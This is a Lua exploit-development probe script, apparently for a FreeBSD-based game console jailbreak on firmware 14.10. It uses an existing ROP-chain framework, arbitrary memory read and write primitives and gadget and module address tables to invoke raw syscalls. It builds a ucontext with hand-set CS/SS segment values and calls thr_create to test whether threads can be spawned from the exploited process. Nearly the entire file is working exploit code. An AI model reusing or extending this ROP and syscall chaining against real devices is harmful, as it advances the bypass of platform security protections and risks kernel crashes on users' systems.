-- CRASH_CLASS: HIGH (may panic if CS=0x43 hypothesis is wrong)
-- PROBE 126a: thr_create via ropchain with CS=0x43/SS=0x3B
-- Uses the loader's ropchain framework for proper syscall invocation.
-- If CS=0x43 prevents the panic, we get a live user-mode thread.

print("=== PROBE 126a: THR_CREATE VIA ROPCHAIN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Section A: First test if syscall works via ropchain for a safe syscall
print("")
print("--- SECTION A: ROPCHAIN SYSCALL TEST ---")
local ok_a, err_a = pcall(function()
    local chain = ropchain()
    -- push_syscall_with_ret: makes syscall and stores return value
    -- Need to understand the API: does push_syscall take a syscall object?

    -- Let's try using push_syscall_raw which should take raw syscall number
    -- Test with getpid (syscall 20)
    local result_buf = memory.alloc(8)
    memory.write_qword(result_buf, 0)

    chain:push_set_rax(20)  -- syscall number
    chain:push_syscall_raw()
    chain:push_store_rax_into_memory(result_buf)
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()

    local ret_pid = memory.read_qword(result_buf)
    print("ropchain getpid=" .. tostring(ret_pid) .. " numeric=" .. to_num(ret_pid))
    print("expected pid=" .. pid)
end)
print("section A: ok=" .. tostring(ok_a) .. " err=" .. tostring(err_a))

-- Section B: Get main thread TID
print("")
print("--- SECTION B: MAIN THREAD TID ---")
local main_tid = 0
local ok_b, err_b = pcall(function()
    local tid_buf = memory.alloc(8)
    memory.write_qword(tid_buf, 0)

    local chain = ropchain()
    -- thr_self(432) takes long *id
    chain:push_set_rax(432)
    chain:push_set_rdi(tid_buf)
    chain:push_syscall_raw()
    chain:push_store_rax_into_memory(tid_buf + 8) -- store ret in separate slot
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()

    -- Actually thr_self writes to the pointer, not returns
    -- But the chain stores rax (return value) at tid_buf+8
    -- Read the actual TID from tid_buf
    main_tid = to_num(memory.read_dword(tid_buf))
    local ret = to_num(memory.read_qword(tid_buf + 8))
    print("main_tid=" .. main_tid .. " ret=" .. ret)
end)
print("section B: ok=" .. tostring(ok_b) .. " err=" .. tostring(err_b))

-- Section C: CANARY CHECK before risky operation
print("")
print("--- SECTION C: PRE-THR_CREATE CANARY ---")
local canary_ok = pcall(function() return to_num(syscall.getpid()) end)
print("canary: " .. tostring(canary_ok))

if not canary_ok then
    print("CANARY FAILED - ABORTING")
    print("=== PROBE 126a ABORT ===")
    return
end

-- Section D: Build ucontext with CS=0x43/SS=0x3B
-- thr_create(430) takes: ucontext_t *ctx, long *id
-- ucontext_t layout (FreeBSD amd64):
--   +0x00: uc_sigmask (16 bytes)
--   +0x10: uc_mcontext
--     mcontext offsets (from +0x10):
--       +0x48: mc_rdi
--       +0x50: mc_rsi
--       +0x58: mc_rdx
--       +0x60: mc_rbx
--       +0x68: mc_rcx
--       +0x70: mc_rax
--       +0x80: mc_rbp
--       +0x88: mc_rip
--       +0x90: mc_cs    <-- KEY: must be 0x43
--       +0x98: mc_rflags
--       +0xA0: mc_rsp
--       +0xA8: mc_ss    <-- KEY: must be 0x3B
--   +0x1A0: uc_flags
--   Total size: ~0x340

print("")
print("--- SECTION D: THR_CREATE WITH CS=0x43 ---")

-- Allocate a stack for the new thread (16KB)
local thread_stack_size = 0x4000
local thread_stack = memory.alloc(thread_stack_size)
-- Stack grows down, so RSP points to top
local thread_rsp = thread_stack + thread_stack_size - 0x100

-- Find a simple gadget for RIP
-- Use a "ret" gadget - the thread will just return immediately
-- From 125g: gadgets contains ret
local ret_gadget = nil
if gadgets then
    for k, v in pairs(gadgets) do
        if type(k) == "string" and k:find("ret") and not k:find("pop") then
            ret_gadget = v
            print("ret gadget: " .. tostring(v))
            break
        end
    end
    if not ret_gadget and gadgets.ret then
        ret_gadget = gadgets.ret
        print("gadgets.ret=" .. tostring(ret_gadget))
    end
end

-- Fallback: search the gadgets table for any ret
if not ret_gadget then
    print("searching gadgets for ret...")
    if gadgets then
        for k, v in pairs(gadgets) do
            print("  gadget." .. tostring(k) .. "=" .. tostring(v))
        end
    end
end

if not ret_gadget then
    print("NO RET GADGET FOUND - using eboot+0x42")
    -- From earlier probes, eboot+0x42 is often a ret
    local info = memory.alloc(0x200)
    memory.write_dword(info, 0x160)
    local sc_info = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
    sc_info(eboot_addrofs.luaL_optinteger, 1, uint64(memory.alloc(0x200)))
    -- Just use a known address
    ret_gadget = eboot_addrofs.luaL_optinteger -- This is a real function, will work as RIP
    print("using luaL_optinteger as thread entry (will crash thread, not kernel)")
end

-- Build ucontext
local ucontext = memory.alloc(0x400)
-- Zero it all
for off = 0, 0x3FC, 4 do
    memory.write_dword(ucontext + off, 0)
end

-- Set mcontext registers
local mc = ucontext + 0x10  -- mcontext starts at offset 0x10
memory.write_qword(mc + 0x88, ret_gadget)    -- mc_rip
memory.write_dword(mc + 0x90, 0x43)          -- mc_cs = USER_CS
memory.write_qword(mc + 0x98, uint64(0x202)) -- mc_rflags = IF + reserved
memory.write_qword(mc + 0xA0, thread_rsp)    -- mc_rsp
memory.write_dword(mc + 0xA8, 0x3B)          -- mc_ss = USER_SS

-- Set uc_flags to indicate mcontext is valid
-- UCF_SWAPPED = 0x1 (on FreeBSD, not needed?)
-- Actually, uc_flags at +0x1A0 for full context restore
-- mc_flags at mcontext+0xB8 might need _MC_HASSEGS
memory.write_qword(mc + 0xB8, uint64(0x1))   -- mc_flags = _MC_HASSEGS

print("ucontext built:")
print("  mc_rip=" .. tostring(memory.read_qword(mc + 0x88)))
print("  mc_cs=0x" .. string.format("%X", to_num(memory.read_dword(mc + 0x90))))
print("  mc_rflags=" .. tostring(memory.read_qword(mc + 0x98)))
print("  mc_rsp=" .. tostring(memory.read_qword(mc + 0xA0)))
print("  mc_ss=0x" .. string.format("%X", to_num(memory.read_dword(mc + 0xA8))))

-- Prepare TID output buffer
local new_tid_buf = memory.alloc(8)
memory.write_qword(new_tid_buf, 0)

-- *** THE CRITICAL CALL ***
-- thr_create(430): int thr_create(ucontext_t *ctx, long *id, int flags)
-- flags=0 for default
print("")
print("*** CALLING thr_create(430) WITH CS=0x43 ***")

local thr_ret_buf = memory.alloc(8)
memory.write_qword(thr_ret_buf, uint64(0xDEADDEAD))

local ok_d, err_d = pcall(function()
    local chain = ropchain()
    chain:push_set_rax(430)           -- syscall 430 = thr_create
    chain:push_set_rdi(ucontext)      -- arg1: ucontext
    chain:push_set_rsi(new_tid_buf)   -- arg2: &tid
    chain:push_set_rdx(0)             -- arg3: flags=0
    chain:push_syscall_raw()
    chain:push_store_rax_into_memory(thr_ret_buf)
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()
end)

print("thr_create: ok=" .. tostring(ok_d) .. " err=" .. tostring(err_d))

-- Check results
local thr_ret = memory.read_qword(thr_ret_buf)
local new_tid = memory.read_qword(new_tid_buf)
print("thr_create return=" .. tostring(thr_ret) .. " numeric=" .. to_num(thr_ret))
print("new TID=" .. tostring(new_tid) .. " numeric=" .. to_num(new_tid))

-- Section E: Post-thr_create canary
print("")
print("--- SECTION E: POST-THR_CREATE CANARY ---")
local post_ok = pcall(function() return to_num(syscall.getpid()) end)
print("canary: " .. tostring(post_ok))

if post_ok and to_num(new_tid) > 0 then
    print("")
    print("*** THREADING IS ALIVE! TID=" .. to_num(new_tid) .. " ***")
    print("*** CS=0x43 FIX WORKS ON 14.10 ***")

    -- Give thread a moment to execute
    sleep(0.1, 's')

    -- Check if thread is still alive
    local kill_ret_buf = memory.alloc(8)
    pcall(function()
        local chain = ropchain()
        chain:push_set_rax(433)  -- thr_kill
        chain:push_set_rdi(new_tid)
        chain:push_set_rsi(0)   -- sig=0 (just check if alive)
        chain:push_syscall_raw()
        chain:push_store_rax_into_memory(kill_ret_buf)
        chain:restore_through_longjmp()
        chain:execute_through_coroutine()
    end)
    local kill_ret = to_num(memory.read_qword(kill_ret_buf))
    print("thr_kill(tid, 0) = " .. kill_ret .. " (0=alive, -1=dead)")
end

print("=== PROBE 126a COMPLETE ===")
